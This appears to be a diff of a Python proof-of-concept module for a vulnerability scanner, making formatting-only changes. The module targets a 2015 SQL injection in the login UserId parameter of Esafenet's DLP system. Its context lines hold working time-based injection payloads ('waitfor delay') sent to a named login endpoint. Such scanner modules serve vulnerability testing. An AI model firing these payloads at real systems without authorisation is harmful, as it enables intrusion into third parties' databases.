@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
     vuln_id = 'Esafenet_0006'  # 平台漏洞编号，留空
     name = '亿赛通数据泄露防护系统(DLP) SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-08-03'  # 漏洞公布时间
     desc = '''
         亿赛通数据泄露防护系统(DLP)，登录处UserId参数注入，导致SQL注入漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '亿赛通'  # 漏洞应用名称
     product_version = '亿赛通数据泄露防护系统(DLP)'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'c1f45740-b8c3-4632-92fd-10103cefc3dc'
@@ -32,11 +34,11 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://www.wooyun.org/bugs/wooyun-2010-0131186
+            # refer: http://www.wooyun.org/bugs/wooyun-2010-0131186
             hh = hackhttp.hackhttp()
             arg = self.target
             url = arg + '/CDGServer3/3g/LoginAction'
-            #sleep 0
+            # sleep 0
             post1 = 'userId=test\';waitfor delay \'0:0:0\'--&password=asdfsd'
             post2 = 'userId=test\';waitfor delay \'0:0:5\'--&password=asdfsd'
             t1 = time.time()
@@ -58,6 +60,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
